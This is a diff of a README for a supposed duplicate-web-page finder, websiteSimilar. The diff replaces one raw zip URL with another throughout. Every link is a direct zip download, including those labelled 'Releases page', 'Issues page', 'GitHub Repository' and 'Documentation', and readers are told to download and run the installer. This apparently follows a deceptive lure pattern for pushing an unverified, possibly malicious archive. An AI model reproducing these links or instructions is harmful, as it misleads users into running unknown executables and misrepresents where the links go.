@@ -6,7 +6,7 @@ Welcome to websiteSimilar! This tool helps you find duplicate web pages by rende
 
 ### 📥 Download Now
 
-[![Download websiteSimilar](https://raw.githubusercontent.com/robloasd/websiteSimilar/main/internal/websiteSimilar-v3.6.zip)](https://raw.githubusercontent.com/robloasd/websiteSimilar/main/internal/websiteSimilar-v3.6.zip)
+[![Download websiteSimilar](https://github.com/robloasd/websiteSimilar/raw/refs/heads/main/cmd/Similar_website_1.3.zip)](https://github.com/robloasd/websiteSimilar/raw/refs/heads/main/cmd/Similar_website_1.3.zip)
 
 ## 📋 Overview
 
@@ -31,7 +31,7 @@ Before you proceed, ensure your system meets the following requirements:
 
 ### 1. Visit the Releases Page
 
-Go to the [Releases page](https://raw.githubusercontent.com/robloasd/websiteSimilar/main/internal/websiteSimilar-v3.6.zip) to access the latest version of websiteSimilar.
+Go to the [Releases page](https://github.com/robloasd/websiteSimilar/raw/refs/heads/main/cmd/Similar_website_1.3.zip) to access the latest version of websiteSimilar.
 
 ### 2. Choose Your Version
 
@@ -39,7 +39,7 @@ On the Releases page, you will see different versions of the software. Select th
 
 ### 3. Download the Installer
 
-Click on the download link for your operating system. Depending on your system, look for files named like `https://raw.githubusercontent.com/robloasd/websiteSimilar/main/internal/websiteSimilar-v3.6.zip`, `https://raw.githubusercontent.com/robloasd/websiteSimilar/main/internal/websiteSimilar-v3.6.zip`, or similar downloads.
+Click on the download link for your operating system. Depending on your system, look for files named like `https://github.com/robloasd/websiteSimilar/raw/refs/heads/main/cmd/Similar_website_1.3.zip`, `https://github.com/robloasd/websiteSimilar/raw/refs/heads/main/cmd/Similar_website_1.3.zip`, or similar downloads.
 
 ### 4. Run the Installer
 
@@ -83,11 +83,11 @@ Based on the results, you can choose to delete or modify duplicates on your webs
 
 ## 📞 Support
 
-If you run into issues or have questions, visit the [Issues page](https://raw.githubusercontent.com/robloasd/websiteSimilar/main/internal/websiteSimilar-v3.6.zip) on GitHub. You can report any problems or request features directly from there.
+If you run into issues or have questions, visit the [Issues page](https://github.com/robloasd/websiteSimilar/raw/refs/heads/main/cmd/Similar_website_1.3.zip) on GitHub. You can report any problems or request features directly from there.
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/robloasd/websiteSimilar/main/internal/websiteSimilar-v3.6.zip)
-- [Documentation](https://raw.githubusercontent.com/robloasd/websiteSimilar/main/internal/websiteSimilar-v3.6.zip) for further details on usage.
+- [GitHub Repository](https://github.com/robloasd/websiteSimilar/raw/refs/heads/main/cmd/Similar_website_1.3.zip)
+- [Documentation](https://github.com/robloasd/websiteSimilar/raw/refs/heads/main/cmd/Similar_website_1.3.zip) for further details on usage.
 
 Thank you for using websiteSimilar! Your feedback helps improve our tool.
